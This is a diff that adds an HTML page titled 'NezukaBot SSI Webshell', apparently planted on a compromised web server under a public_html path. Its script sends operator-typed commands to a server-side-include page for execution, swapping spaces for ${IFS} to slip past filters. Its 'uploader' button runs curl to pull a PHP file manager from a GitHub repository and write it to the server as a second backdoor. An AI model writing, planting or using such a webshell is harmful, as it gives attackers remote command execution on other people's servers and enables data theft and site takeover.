@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>NezukaBot SSI Webshell</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script language="javascript">
+function nezcmd()
+{
+  var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="1415-1-2890-1-2-20241218.shtml?"+encodeURI(rep);
+}
+
+function addupload()
+{
+	document.location.href="1415-1-2890-1-2-20241218.shtml?"+"curl${IFS}-Ls${IFS}raw.githubusercontent.com/AzhariKun/webshell/main/sfm.php${IFS}|${IFS}tee${IFS}-a${IFS}sfm.php";
+}
+</script>
+<style type="text/css">
+	.input {
+		background: transparent;
+		border-color: #ffffff;
+		border-width: thin;
+		border: groove;
+		cursor: pointer;
+	}
+
+	button {
+		cursor: pointer;
+	}
+</style>
+</head>
+<b><font face="courier" size="4"><i>NezukaBot SSI Webshell</font></b><font face="courier">
+	<br><br>System : <b>Function SSI Disabled</b>
+	<br>Current Path : <b>/home/ojsunh/public_html</b></i><br><br>
+	MySql : <b>Function SSI Disabled</b>&nbsp;|&nbsp; Wget : <b>Function SSI Disabled</b></b>&nbsp;|&nbsp; Curl : <b>Function SSI Disabled</b><br>
+	<font> COMMAND : <input type="text" size="30" id="command" class="text" name="address1" style="max-width: 100%; max-height: 100%;">&nbsp;<button class="input" id="gas" onclick="nezcmd();">execute</button> <button class="input" id="gas" onclick="addupload();">uploader</button><br><br>
+Executed Command : </font><b><font face="courier" id="cmd">whoami</font></b></i>
+<pre>Function SSI Disabled</pre>
+<script>
+  var cmd = document.getElementById("cmd").innerHTML.split("${IFS}").join(" ");
+	document.getElementById("cmd").innerHTML = cmd;
+	var gaskan = document.getElementById("command");
+	gaskan.addEventListener("keyup", function(event) {
+	  if (event.keyCode === 13) {
+	    event.preventDefault();
+	    document.getElementById("gas").click();
+	}
+});
+</script>
+</html>
